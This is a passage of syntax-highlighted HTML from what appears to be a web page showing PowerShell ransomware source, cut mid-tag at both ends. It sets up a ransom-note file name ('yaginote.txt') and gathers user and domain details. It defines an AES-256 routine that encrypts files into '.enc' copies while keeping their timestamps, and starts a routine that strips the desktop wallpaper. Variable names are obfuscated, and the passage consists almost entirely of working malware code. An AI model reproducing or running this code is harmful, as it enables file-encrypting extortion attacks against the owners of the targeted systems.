style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ([\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">Environment\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::UserName).ToLower() ; $I26 \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"yaginote.txt\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$7VEq \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Get-Date\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Format \u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"HH:mm - dd/MM/yy\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ; $Uz19o \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $7VEq.replace(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\":\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">).replace(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\" \"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">).replace(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"-\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">).replace(\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"/\"\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">+\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$zVSza\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">+\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$OgE\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ($OSVersion \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-like\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"*Win*\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) { $domain \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (([\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">Environment\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::UserDomainName).ToLower()\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">+\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\\\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">) ; $slash \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"\\\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> } \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">else\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> { $domain \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $null\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ; $slash \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"/\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> } \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$DirectoryTarget \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $Directory.Split($slash)[\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">-1\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">] ; \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$DirectoryTarget) { $DirectoryTarget \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $Directory.Path.Split($slash)[\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">-1\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">] }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">function\u003C/span>\u003Cspan style=\"--shiki-light:#622CBC;--shiki-dark:#DBB7FF\"> Invoke-AESEncryption\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   [\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">CmdletBinding\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">()]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   [\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">OutputType\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">([\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">string\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">])]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">   Param\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">       [\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Parameter\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(\u003C/span>\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">Mandatory\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> =\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $true\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">       [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">String\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]$Key\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">       [\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Parameter\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(\u003C/span>\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">Mandatory\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> =\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $true\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\"> ParameterSetName\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> =\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"CryptText\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">       [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">String\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]$Text\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">       [\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Parameter\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">(\u003C/span>\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\">Mandatory\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> =\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $true\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#702C00;--shiki-dark:#FFB757\"> ParameterSetName\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> =\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \"CryptFile\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">)]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">       [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">String\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]$Path)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">   Begin\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $m95I \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> New-Object\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> System.Security.Cryptography.SHA256Managed\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $n9ibn \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> New-Object\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> System.Security.Cryptography.AesManaged\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $n9ibn.Mode \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">System.Security.Cryptography.CipherMode\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::CBC\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $n9ibn.Padding \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">System.Security.Cryptography.PaddingMode\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::PKCS7\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $n9ibn.BlockSize \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> 128\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $n9ibn.KeySize \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> 256\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">   Process\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $n9ibn.Key \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $m95I.ComputeHash([\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">System.Text.Encoding\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::UTF8.GetBytes($Key))\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">      if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ($Text) {$plainBytes \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">System.Text.Encoding\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::UTF8.GetBytes($Text)}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">      if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ($Path) {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">         $File \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Get-Item\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">Path $Path \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">ErrorAction SilentlyContinue\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">         if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> (\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$File.FullName) { \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">break\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">         $plainBytes \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">System.IO.File\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::ReadAllBytes($File.FullName)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">         $outPath \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $File.FullName \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">+\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \".enc\"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $encryptor \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $n9ibn.CreateEncryptor()\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $encryptedBytes \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $encryptor.TransformFinalBlock($plainBytes\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> 0\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $plainBytes.Length)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $encryptedBytes \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $n9ibn.IV \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">+\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $encryptedBytes\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $n9ibn.Dispose()\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">      if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ($Text) {\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">return\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">System.Convert\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::ToBase64String($encryptedBytes)}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">      if\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> ($Path) {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">         [\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">System.IO.File\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">]::WriteAllBytes($outPath\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">,\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $encryptedBytes)\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">         (\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Get-Item\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $outPath).LastWriteTime \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $File.LastWriteTime }}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">  End\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $m95I.Dispose()\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $n9ibn.Dispose()}}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">function\u003C/span>\u003Cspan style=\"--shiki-light:#622CBC;--shiki-dark:#DBB7FF\"> RemoveWallpaper\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$code \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">=\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> @\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">using System;\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">using System.Drawing;\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">using System.Runtime.InteropServices;\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">using Microsoft.Win32;\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">namespace CurrentUser { public class Desktop {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">[DllImport(\"user32.dll\", SetLastError = true, CharSet = CharSet.Auto)]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">private static extern int SystemParametersInfo(int uAction, int uParm, string lpvParam, int fuWinIni);\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">[DllImport(\"user32.dll\", CharSet = CharSet.Auto, SetLastError = true)]\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">private static extern int SetSysColors(int cElements, int[] lpaElements, int[] lpRgbValues);\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">public const int UpdateIniFile = 0x01; public const int SendWinIniChange = 0x02;\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">public const int SetDesktopBackground = 0x0014; public const int COLOR_DESKTOP = 1;\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">public int[] first = {COLOR_DESKTOP};\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">public static void RemoveWallPaper(){\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">SystemParametersInfo( SetDesktopBackground, 0, \"\", SendWinIniChange | UpdateIniFile );\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">RegistryKey regkey = Registry.CurrentUser.OpenSubKey(\"Control Panel\\\\Desktop\", true);\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">regkey.SetValue(@\"WallPaper\", 0); regkey.Close();}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">public static void SetBackground(byte r, byte g, byte b){ int[] elements = {COLOR_DESKTOP};\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">RemoveWallPaper();\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">System.Drawing.Color color = System.Drawing.Color.FromArgb(r,g,b);\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan 